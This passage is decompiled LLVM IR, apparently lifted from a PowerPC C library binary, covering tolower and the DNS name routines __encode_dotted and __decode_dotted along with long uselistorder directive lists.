  br i1 %v3_1000faf0, label %dec_label_pc_1000fb14, label %dec_label_pc_1000fb04

dec_label_pc_1000fb04:                            ; preds = %entry
  %v0_1000fb04 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000fb0c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fb0c = inttoptr i32 %v0_1000fb04 to i32*
  store i32 %v0_1000fb0c, i32* %v2_1000fb0c, align 4
  %v0_1000fb18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fb18

dec_label_pc_1000fb14:                            ; preds = %entry
  %v3_1000fafc = icmp eq i32 %v0_1000faec, 0
  br i1 %v3_1000fafc, label %dec_label_pc_1000fb24, label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000fb14, %dec_label_pc_1000fb04
  %v0_1000fb18 = phi i32 [ %v0_1000faec, %dec_label_pc_1000fb14 ], [ %v0_1000fb18.pre, %dec_label_pc_1000fb04 ]
  %tmp = icmp slt i32 %v0_1000fb18, 0
  %v1_1000fb1c = zext i1 %tmp to i32
  %v2_1000fb1c = ashr i32 %v0_1000fb18, 31
  %v3_1000fb1c = and i32 %v2_1000fb1c, -2
  %v4_1000fb1c = or i32 %v3_1000fb1c, %v1_1000fb1c
  br label %dec_label_pc_1000fb2c

dec_label_pc_1000fb24:                            ; preds = %dec_label_pc_1000fb14
  %v3_1000fb24 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000fb2c

dec_label_pc_1000fb2c:                            ; preds = %dec_label_pc_1000fb18, %dec_label_pc_1000fb24
  %v0_1000fb3c = phi i32 [ %v4_1000fb1c, %dec_label_pc_1000fb18 ], [ %v3_1000fb24, %dec_label_pc_1000fb24 ]
  store i32 %v0_1000fac0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fb3c

; uselistorder directives
  uselistorder i32 %v0_1000fb18, { 1, 0 }
  uselistorder i32 %v0_1000faec, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 4 }
  uselistorder i32 31, { 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 11, 12, 1, 2, 42, 43, 13, 14, 15, 7, 8, 3, 4, 0, 6, 5, 16, 17, 18, 48, 49, 46, 47, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 41, 9, 44, 45 }
  uselistorder i32 ()* @__errno_location, { 50, 41, 67, 66, 65, 40, 23, 49, 48, 39, 18, 36, 47, 46, 30, 51, 14, 13, 12, 11, 10, 25, 9, 7, 61, 60, 53, 52, 64, 63, 62, 24, 59, 22, 35, 3, 2, 45, 44, 43, 0, 38, 37, 15, 42, 17, 16, 58, 32, 31, 57, 29, 6, 20, 28, 19, 56, 55, 34, 27, 26, 54, 8, 5, 4, 1, 68, 33, 21 }
  uselistorder i32 268435456, { 5, 7, 19, 11, 4, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb2c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000fb40 = add i32 %arg1, 128
  %v1_1000fb44 = mul i32 %arg1, 2
  %v2_1000fb48 = icmp ugt i32 %v1_1000fb40, 383
  %v0_1000fb4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000fb48, i32 %v0_1000fb4c)
  %v3_1000fb54 = load i32, i32* bitcast (i32** @global_var_10024a24.599 to i32*), align 4
  %v2_1000fb58 = add i32 %v1_1000fb44, %v3_1000fb54
  %v3_1000fb58 = inttoptr i32 %v2_1000fb58 to i16*
  %v4_1000fb58 = load i16, i16* %v3_1000fb58, align 2
  %v5_1000fb58 = sext i16 %v4_1000fb58 to i32
  ret i32 %v5_1000fb58

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 20, 21, 4, 5, 18, 3, 6, 7, 10, 11, 12, 13, 8, 14, 15, 16, 2, 9, 19 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000fb64 = load i32, i32* @lr, align 4
  store i32 %v0_1000fb64, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000fb70 = load i32, i32* @r4, align 4
  store i32 %v0_1000fb70, i32* @r29, align 4
  %v0_1000fb74 = load i32, i32* @r5, align 4
  store i32 %v0_1000fb74, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000fbe013 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000fbe013, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fbf0

dec_label_pc_1000fb84:                            ; preds = %dec_label_pc_1000fbf0
  store i32 268499848, i32* @lr, align 4
  %v3_1000fb84 = call i32 @__GI_strchr(i32 %v0_1000fbf014, i32 46)
  store i32 %v3_1000fb84, i32* @r30, align 4
  %v3_1000fb88 = icmp eq i32 %v3_1000fb84, 0
  %v0_1000fb8c = load i32, i32* @r31, align 4
  store i32 %v0_1000fb8c, i32* @r3, align 4
  %v2_1000fb90 = sub i32 %v3_1000fb84, %v0_1000fb8c
  store i32 %v2_1000fb90, i32* %r0.global-to-local, align 4
  br i1 %v3_1000fb88, label %dec_label_pc_1000fb98, label %dec_label_pc_1000fba0

dec_label_pc_1000fb98:                            ; preds = %dec_label_pc_1000fb84
  %v0_1000fb98 = call i32 @__GI_strlen()
  store i32 %v0_1000fb98, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000fb98, 16777216
  %v1_1000fb9c = sdiv i32 %sext, 16777216
  store i32 %v1_1000fb9c, i32* %r0.global-to-local, align 4
  %v0_1000fbb0.pre = load i32, i32* @r31, align 4
  %v0_1000fbc0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fba0

dec_label_pc_1000fba0:                            ; preds = %dec_label_pc_1000fb84, %dec_label_pc_1000fb98
  %v0_1000fbc0 = phi i32 [ %v3_1000fb84, %dec_label_pc_1000fb84 ], [ %v0_1000fbc0.pre, %dec_label_pc_1000fb98 ]
  %v0_1000fbb0 = phi i32 [ %v0_1000fb8c, %dec_label_pc_1000fb84 ], [ %v0_1000fbb0.pre, %dec_label_pc_1000fb98 ]
  %v0_1000fbcc = phi i32 [ %v2_1000fb90, %dec_label_pc_1000fb84 ], [ %v1_1000fb9c, %dec_label_pc_1000fb98 ]
  %v0_1000fba4 = load i32, i32* @r28, align 4
  %v1_1000fba4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fba4 = sub i32 %v1_1000fba4, %v0_1000fba4
  %v1_1000fba8 = add i32 %v0_1000fba4, 1
  store i32 %v1_1000fba8, i32* %r11.global-to-local, align 4
  %v1_1000fbac = add i32 %v2_1000fba4, -1
  store i32 %v0_1000fbb0, i32* @r4, align 4
  %v0_1000fbb4 = load i32, i32* @r29, align 4
  %v2_1000fbb4 = add i32 %v0_1000fbb4, %v1_1000fba8
  store i32 %v2_1000fbb4, i32* @r3, align 4
  store i32 %v0_1000fbcc, i32* @r5, align 4
  %v2_1000fbbc = icmp ult i32 %v0_1000fbcc, %v1_1000fbac
  %v1_1000fbc0 = add i32 %v0_1000fbc0, 1
  store i32 %v1_1000fbc0, i32* @r31, align 4
  %v3_1000fba0.not = icmp ne i32 %v0_1000fbcc, 0
  %or.cond = and i1 %v2_1000fbbc, %v3_1000fba0.not
  br i1 %or.cond, label %dec_label_pc_1000fbcc, label %dec_label_pc_1000fc14

dec_label_pc_1000fbcc:                            ; preds = %dec_label_pc_1000fba0
  %v3_1000fbcc = trunc i32 %v0_1000fbcc to i8
  %v4_1000fbcc = add i32 %v0_1000fbb4, %v0_1000fba4
  %v5_1000fbcc = inttoptr i32 %v4_1000fbcc to i8*
  store i8 %v3_1000fbcc, i8* %v5_1000fbcc, align 1
  %v0_1000fbd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fbd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000fbd0 = add i32 %v1_1000fbd0, %v0_1000fbd0
  store i32 %v2_1000fbd0, i32* @r28, align 4
  store i32 268499928, i32* @lr, align 4
  %v0_1000fbd4 = call i32 @memcpy()
  store i32 %v0_1000fbd4, i32* %r3.global-to-local, align 4
  %v0_1000fbd8 = load i32, i32* @r30, align 4
  %v3_1000fbd8 = icmp eq i32 %v0_1000fbd8, 0
  br i1 %v3_1000fbd8, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fbcc.dec_label_pc_1000fbe0_crit_edge

dec_label_pc_1000fbcc.dec_label_pc_1000fbe0_crit_edge: ; preds = %dec_label_pc_1000fbcc
  %v0_1000fbe0.pre = load i32, i32* @r31, align 4
  %v3_1000fbe0 = icmp eq i32 %v0_1000fbe0.pre, 0
  store i32 %v0_1000fbe0.pre, i32* @r3, align 4
  br i1 %v3_1000fbe0, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fbf0

dec_label_pc_1000fbf0:                            ; preds = %entry, %dec_label_pc_1000fbcc.dec_label_pc_1000fbe0_crit_edge
  %v0_1000fbf014 = phi i32 [ %v0_1000fbe0.pre, %dec_label_pc_1000fbcc.dec_label_pc_1000fbe0_crit_edge ], [ %tmp, %entry ]
  %v1_1000fbf0 = inttoptr i32 %v0_1000fbf014 to i8*
  %v2_1000fbf0 = load i8, i8* %v1_1000fbf0, align 1
  %v3_1000fbf0 = zext i8 %v2_1000fbf0 to i32
  store i32 %v3_1000fbf0, i32* %r0.global-to-local, align 4
  %v3_1000fbf4 = icmp eq i8 %v2_1000fbf0, 0
  br i1 %v3_1000fbf4, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fb84

dec_label_pc_1000fbfc:                            ; preds = %dec_label_pc_1000fbcc.dec_label_pc_1000fbe0_crit_edge, %dec_label_pc_1000fbcc, %dec_label_pc_1000fbf0, %entry
  %v0_1000fbfc = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000fbfc, 1
  br i1 %tmp10, label %dec_label_pc_1000fc14, label %dec_label_pc_1000fc04

dec_label_pc_1000fc04:                            ; preds = %dec_label_pc_1000fbfc
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000fc08 = load i32, i32* @r28, align 4
  %v1_1000fc08 = add i32 %v0_1000fc08, 1
  store i32 %v1_1000fc08, i32* %r3.global-to-local, align 4
  %v1_1000fc0c = load i32, i32* @r29, align 4
  %v4_1000fc0c = add i32 %v1_1000fc0c, %v0_1000fc08
  %v5_1000fc0c = inttoptr i32 %v4_1000fc0c to i8*
  store i8 0, i8* %v5_1000fc0c, align 1
  %v0_1000fc28.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fc18

dec_label_pc_1000fc14:                            ; preds = %dec_label_pc_1000fba0, %dec_label_pc_1000fbfc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000fc18

dec_label_pc_1000fc18:                            ; preds = %dec_label_pc_1000fc04, %dec_label_pc_1000fc14
  %v0_1000fc28 = phi i32 [ %v0_1000fc28.pre, %dec_label_pc_1000fc04 ], [ -1, %dec_label_pc_1000fc14 ]
  store i32 %v0_1000fb64, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fc28

; uselistorder directives
  uselistorder i32 %v0_1000fbf014, { 1, 0 }
  uselistorder i32 %v0_1000fbe0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000fbcc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000fb9c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 8, 22, 21, 2, 5, 12, 11, 10, 23, 20, 19, 18, 16, 17, 15, 14, 13, 9, 7, 0, 6, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 2, 0, 8, 7, 6, 5, 4, 1 }
  uselistorder i32 46, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000fc18, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc14, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbfc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000fbf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fba0, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000fc30 = call i32 @__asm_mfcr()
  store i32 %v0_1000fc30, i32* @r26, align 4
  %v3_1000fc3c = icmp eq i32 %v0_1000fc30, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000fc4c = load i32, i32* @r6, align 4
  store i32 %v0_1000fc4c, i32* @r24, align 4
  br i1 %v3_1000fc3c, label %dec_label_pc_1000fd04, label %dec_label_pc_1000fc54

dec_label_pc_1000fc54:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000fce014 = load i32, i32* @r4, align 4
  %v2_1000fce015 = add i32 %v1_1000fce014, %v0_1000fc30
  %v3_1000fce016 = inttoptr i32 %v2_1000fce015 to i8*
  %v4_1000fce017 = load i8, i8* %v3_1000fce016, align 1
  %v5_1000fce018 = zext i8 %v4_1000fce017 to i32
  store i32 %v5_1000fce018, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fce820 = icmp eq i8 %v4_1000fce017, 0
  br i1 %v3_1000fce820, label %dec_label_pc_1000fcf4, label %dec_label_pc_1000fc64

dec_label_pc_1000fc64:                            ; preds = %dec_label_pc_1000fc54, %dec_label_pc_1000fcdc
  %v3_1000fce422 = phi i1 [ %v3_1000fce4, %dec_label_pc_1000fcdc ], [ false, %dec_label_pc_1000fc54 ]
  %v5_1000fce021 = phi i32 [ %v5_1000fce0, %dec_label_pc_1000fcdc ], [ %v5_1000fce018, %dec_label_pc_1000fc54 ]
  br i1 %v3_1000fce422, label %dec_label_pc_1000fc6c, label %dec_label_pc_1000fc68

dec_label_pc_1000fc68:                            ; preds = %dec_label_pc_1000fc64
  %v0_1000fc68 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fc68 = add i32 %v0_1000fc68, 1
  store i32 %v1_1000fc68, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fc6c

dec_label_pc_1000fc6c:                            ; preds = %dec_label_pc_1000fc64, %dec_label_pc_1000fc68
  %v1_1000fc6c = call i32 @__asm_rlwinm(i32 %v5_1000fce021, i32 0, i32 24, i32 25)
  %v0_1000fc70 = load i32, i32* @r4, align 4
  %v1_1000fc70 = add i32 %v0_1000fc70, 1
  store i32 %v1_1000fc70, i32* @r30, align 4
  %v3_1000fc74 = icmp eq i32 %v1_1000fc6c, 192
  br i1 %v3_1000fc74, label %dec_label_pc_1000fc7c, label %dec_label_pc_1000fc9c

dec_label_pc_1000fc7c:                            ; preds = %dec_label_pc_1000fc6c
  %v0_1000fc7c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fc7c, label %dec_label_pc_1000fc84, label %dec_label_pc_1000fc80

dec_label_pc_1000fc80:                            ; preds = %dec_label_pc_1000fc7c
  %v0_1000fc80 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000fc80 = add i32 %v0_1000fc80, 1
  store i32 %v1_1000fc80, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fc84

dec_label_pc_1000fc84:                            ; preds = %dec_label_pc_1000fc7c, %dec_label_pc_1000fc80
  %v0_1000fc84 = load i32, i32* @r26, align 4
  %v2_1000fc84 = add i32 %v0_1000fc84, %v1_1000fc70
  %v3_1000fc84 = inttoptr i32 %v2_1000fc84 to i8*
  %v4_1000fc84 = load i8, i8* %v3_1000fc84, align 1
  %v5_1000fc84 = zext i8 %v4_1000fc84 to i32
  %v1_1000fc88 = call i32 @__asm_rlwinm(i32 %v5_1000fce021, i32 8, i32 18, i32 23)
  %v0_1000fc8c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000fc8c, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000fc94 = or i32 %v5_1000fc84, %v1_1000fc88
  store i32 %v2_1000fc94, i32* @r4, align 4
  br label %dec_label_pc_1000fcdc

dec_label_pc_1000fc9c:                            ; preds = %dec_label_pc_1000fc6c
  %v0_1000fc9c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fc9c = add i32 %v0_1000fc9c, %v5_1000fce021
  store i32 %v2_1000fc9c, i32* @r29, align 4
  %v1_1000fca0 = add i32 %v2_1000fc9c, 1
  store i32 %v1_1000fca0, i32* @r28, align 4
  %v1_1000fca4 = load i32, i32* @r24, align 4
  %v2_1000fca4 = icmp ult i32 %v1_1000fca0, %v1_1000fca4
  br i1 %v2_1000fca4, label %dec_label_pc_1000fcac, label %dec_label_pc_1000fd04

dec_label_pc_1000fcac:                            ; preds = %dec_label_pc_1000fc9c
  %v0_1000fcac = load i32, i32* @r26, align 4
  %v2_1000fcac = add i32 %v0_1000fcac, %v1_1000fc70
  store i32 %v2_1000fcac, i32* @r4, align 4
  %v0_1000fcb0 = load i32, i32* @r25, align 4
  %v2_1000fcb0 = add i32 %v0_1000fcb0, %v0_1000fc9c
  store i32 %v2_1000fcb0, i32* @r3, align 4
  store i32 %v5_1000fce021, i32* @r5, align 4
  store i32 268500156, i32* @lr, align 4
  %v0_1000fcb8 = call i32 @memcpy()
  %v0_1000fcbc = load i32, i32* @r30, align 4
  %v2_1000fcbc = add i32 %v0_1000fcbc, %v5_1000fce021
  store i32 %v2_1000fcbc, i32* @r4, align 4
  %v0_1000fcc0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000fcc0, label %dec_label_pc_1000fcc8, label %dec_label_pc_1000fcc4

dec_label_pc_1000fcc4:                            ; preds = %dec_label_pc_1000fcac
  %v0_1000fcc4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000fcc4 = add i32 %v0_1000fcc4, %v5_1000fce021
  store i32 %v2_1000fcc4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fcc8

dec_label_pc_1000fcc8:                            ; preds = %dec_label_pc_1000fcac, %dec_label_pc_1000fcc4
  %v0_1000fcc8 = load i32, i32* @r26, align 4
  %v2_1000fcc8 = add i32 %v0_1000fcc8, %v2_1000fcbc
  %v3_1000fcc8 = inttoptr i32 %v2_1000fcc8 to i8*
  %v4_1000fcc8 = load i8, i8* %v3_1000fcc8, align 1
  %v3_1000fccc = icmp eq i8 %v4_1000fcc8, 0
  br i1 %v3_1000fccc, label %dec_label_pc_1000fcd8, label %dec_label_pc_1000fcd4

dec_label_pc_1000fcd4:                            ; preds = %dec_label_pc_1000fcc8
  br label %dec_label_pc_1000fcd8

dec_label_pc_1000fcd8:                            ; preds = %dec_label_pc_1000fcc8, %dec_label_pc_1000fcd4
  %v0_1000fcd8.off0 = phi i8 [ 0, %dec_label_pc_1000fcc8 ], [ 46, %dec_label_pc_1000fcd4 ]
  %v1_1000fcd8 = load i32, i32* @r25, align 4
  %v2_1000fcd8 = load i32, i32* @r29, align 4
  %v4_1000fcd8 = add i32 %v2_1000fcd8, %v1_1000fcd8
  %v5_1000fcd8 = inttoptr i32 %v4_1000fcd8 to i8*
  store i8 %v0_1000fcd8.off0, i8* %v5_1000fcd8, align 1
  %v0_1000fcdc.pre = load i32, i32* @r28, align 4
  %v0_1000fce4.pre.pre = load i32, i32* @r23, align 4
  %v1_1000fce0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fcdc

dec_label_pc_1000fcdc:                            ; preds = %dec_label_pc_1000fc84, %dec_label_pc_1000fcd8
  %v1_1000fce0 = phi i32 [ %v2_1000fc94, %dec_label_pc_1000fc84 ], [ %v1_1000fce0.pre, %dec_label_pc_1000fcd8 ]
  %v0_1000fce4.pre = phi i32 [ 0, %dec_label_pc_1000fc84 ], [ %v0_1000fce4.pre.pre, %dec_label_pc_1000fcd8 ]
  %v0_1000fcdc = phi i32 [ %v0_1000fc8c, %dec_label_pc_1000fc84 ], [ %v0_1000fcdc.pre, %dec_label_pc_1000fcd8 ]
  %v0_1000fce0.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000fcdc, i32* %r11.global-to-local, align 4
  %v2_1000fce0 = add i32 %v1_1000fce0, %v0_1000fce0.pre
  %v3_1000fce0 = inttoptr i32 %v2_1000fce0 to i8*
  %v4_1000fce0 = load i8, i8* %v3_1000fce0, align 1
  %v5_1000fce0 = zext i8 %v4_1000fce0 to i32
  store i32 %v5_1000fce0, i32* @r31, align 4
  %v3_1000fce4 = icmp eq i32 %v0_1000fce4.pre, 0
  store i1 %v3_1000fce4, i1* %cr4_eq.global-to-local, align 1
  %v3_1000fce8 = icmp eq i8 %v4_1000fce0, 0
  br i1 %v3_1000fce8, label %dec_label_pc_1000fcf0, label %dec_label_pc_1000fc64

dec_label_pc_1000fcf0:                            ; preds = %dec_label_pc_1000fcdc
  %v0_1000fcf8.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000fce4, label %dec_label_pc_1000fd04, label %dec_label_pc_1000fcf4

dec_label_pc_1000fcf4:                            ; preds = %dec_label_pc_1000fc54, %dec_label_pc_1000fcf0
  %v0_1000fcf8.pre26 = phi i32 [ %v0_1000fcf8.pre.pre, %dec_label_pc_1000fcf0 ], [ 0, %dec_label_pc_1000fc54 ]
  %v1_1000fcf4 = add i32 %v0_1000fcf8.pre26, 1
  store i32 %v1_1000fcf4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000fd04

dec_label_pc_1000fd04:                            ; preds = %dec_label_pc_1000fc9c, %dec_label_pc_1000fcf0, %dec_label_pc_1000fcf4, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1000fcf4, %dec_label_pc_1000fcf4 ], [ %v0_1000fcf8.pre.pre, %dec_label_pc_1000fcf0 ], [ -1, %dec_label_pc_1000fc9c ]
  %v1_1000fd14 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000fc30)
  %v9_1000fd14 = extractvalue %0 %v1_1000fd14, 7
  store i4 %v9_1000fd14, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000fcf8.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000fce4, { 0, 2, 1 }
  uselistorder i32 %v5_1000fce0, { 1, 0 }
  uselistorder i32 %v5_1000fce021, { 5, 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1000fc30, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 12, 11, 10, 6, 5, 4, 3, 9, 8, 2, 21, 18, 17, 0, 19, 7, 1, 16, 15, 14, 20, 13 }
  uselistorder i32* @r5, { 41, 42, 43, 3, 44, 45, 46, 13, 57, 58, 50, 51, 11, 4, 52, 1, 53, 14, 15, 16, 17, 18, 19, 59, 20, 21, 22, 23, 24, 25, 72, 9, 10, 8, 6, 54, 55, 64, 65, 66, 12, 26, 27, 28, 73, 74, 75, 76, 67, 68, 2, 69, 70, 71, 29, 31, 30, 32, 0, 33, 34, 35, 60, 61, 47, 48, 36, 37, 38, 49, 7, 62, 63, 5, 39, 40, 56 }
  uselistorder i32* @r29, { 70, 71, 72, 73, 74, 138, 139, 1, 75, 14, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 86, 20, 21, 22, 23, 24, 2, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 40, 100, 102, 103, 119, 120, 140, 141, 42, 43, 44, 41, 125, 16, 45, 46, 3, 47, 48, 49, 50, 51, 52, 142, 143, 144, 145, 146, 147, 148, 4, 35, 124, 127, 128, 129, 130, 25, 26, 131, 5, 132, 133, 134, 135, 136, 137, 121, 122, 123, 6, 126, 7, 149, 150, 151, 53, 54, 8, 55, 56, 57, 58, 110, 111, 15, 112, 104, 105, 106, 109, 107, 17, 9, 0, 108, 59, 60, 61, 62, 63, 64, 65, 68, 10, 13, 11, 69, 19, 66, 67, 152, 153, 154, 155, 113, 114, 115, 116, 117, 12, 118, 101, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 18 }
  uselistorder i32* @r28, { 2, 76, 77, 78, 79, 80, 81, 86, 87, 82, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 17, 3, 16, 18, 19, 20, 21, 22, 23, 98, 102, 99, 100, 101, 1, 103, 104, 41, 42, 128, 129, 136, 137, 43, 4, 44, 45, 46, 47, 48, 5, 138, 139, 140, 141, 148, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 132, 133, 134, 135, 130, 131, 142, 143, 144, 145, 146, 49, 50, 113, 7, 114, 115, 107, 108, 109, 110, 111, 112, 51, 52, 53, 8, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 13, 14, 15, 147, 116, 117, 118, 119, 10, 120, 11, 121, 122, 123, 124, 125, 126, 127, 74, 75, 105, 106, 33, 34, 39, 40 }
  uselistorder i32 23, { 10, 12, 13, 14, 6, 7, 8, 0, 1, 2, 5, 3, 4, 9, 11 }
  uselistorder i32 18, { 1, 0, 3, 4, 2 }
  uselistorder i32 8, { 83, 84, 85, 86, 87, 88, 18, 19, 89, 90, 91, 92, 93, 94, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 95, 96, 97, 98, 17, 46, 117, 0, 100, 47, 48, 49, 50, 51, 52, 53, 54, 10, 55, 56, 57, 129, 130, 137, 140, 8, 33, 34, 11, 31, 12, 80, 115, 32, 121, 120, 118, 119, 35, 36, 37, 122, 123, 124, 125, 126, 127, 1, 108, 109, 110, 21, 134, 135, 136, 2, 141, 3, 138, 139, 101, 102, 38, 103, 39, 58, 59, 60, 61, 62, 22, 63, 64, 65, 66, 4, 5, 67, 68, 9, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 7, 6, 131, 132, 133, 104, 105, 106, 107, 99, 40, 41, 42, 43, 44, 45, 79, 23, 81, 82, 111, 112, 113, 114, 116, 16, 128 }
  uselistorder i32* @r30, { 82, 83, 84, 8, 85, 87, 89, 90, 91, 92, 93, 86, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 108, 105, 106, 5, 107, 4, 40, 41, 42, 9, 43, 44, 45, 110, 111, 112, 121, 122, 123, 124, 17, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 143, 144, 10, 51, 52, 53, 54, 55, 11, 153, 154, 155, 156, 12, 146, 157, 168, 158, 159, 27, 0, 79, 13, 80, 81, 147, 148, 149, 28, 29, 30, 31, 32, 150, 151, 152, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 160, 161, 162, 163, 164, 165, 166, 14, 167, 56, 57, 119, 117, 118, 120, 116, 114, 113, 6, 115, 58, 59, 60, 61, 62, 2, 64, 18, 65, 15, 66, 67, 63, 68, 69, 70, 71, 72, 73, 74, 16, 75, 76, 3, 77, 78, 109, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 8, 9, 0, 11, 12, 13, 3, 10, 7, 14 }
  uselistorder i32* @r31, { 129, 2, 7, 130, 6, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 45, 50, 9, 39, 10, 11, 51, 52, 53, 148, 149, 150, 151, 1, 152, 153, 154, 155, 156, 157, 158, 159, 12, 160, 69, 70, 71, 72, 73, 161, 13, 162, 163, 164, 165, 14, 166, 167, 168, 169, 170, 171, 74, 75, 76, 77, 78, 79, 80, 81, 82, 15, 83, 16, 263, 264, 265, 17, 178, 177, 3, 179, 180, 203, 230, 231, 232, 233, 234, 65, 66, 67, 68, 181, 18, 182, 183, 19, 192, 193, 20, 194, 195, 84, 85, 86, 246, 247, 248, 87, 88, 21, 89, 90, 91, 92, 22, 93, 23, 94, 95, 96, 44, 97, 0, 266, 267, 268, 24, 46, 269, 40, 250, 25, 251, 275, 276, 42, 59, 270, 273, 274, 63, 64, 54, 55, 56, 57, 58, 127, 128, 4, 252, 253, 254, 255, 256, 257, 60, 61, 62, 258, 259, 260, 261, 262, 235, 236, 237, 27, 238, 239, 240, 26, 241, 242, 243, 244, 245, 249, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 98, 99, 196, 197, 198, 28, 199, 200, 201, 186, 187, 188, 189, 190, 29, 